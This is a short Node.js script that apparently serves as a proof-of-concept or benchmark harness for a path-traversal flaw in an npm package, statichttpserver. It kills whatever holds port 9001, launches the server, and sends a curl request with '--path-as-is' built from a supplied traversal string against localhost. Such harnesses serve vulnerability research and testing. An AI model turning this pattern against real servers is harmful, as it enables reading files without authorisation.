function exploitFunction(payload) {
  const { genstr } = payload;
  const path = require("path");  // Import the path module

  // Clean up any running servers
  execSync("fuser -k 9001/tcp");

  // Start the server
  const server = "node ./node_modules/statichttpserver/index.js";
  exec(server, (error, stdout) => {
    sleep.sleep(2);

    // Generate the attack string
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:9001${genstr()}"`;

    // Execute the attack string
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing attack: ${error}`);
      } else {
        console.log(`Output: ${stdout}`);
      }
    });
  });
}

module.exports = { exploitFunction };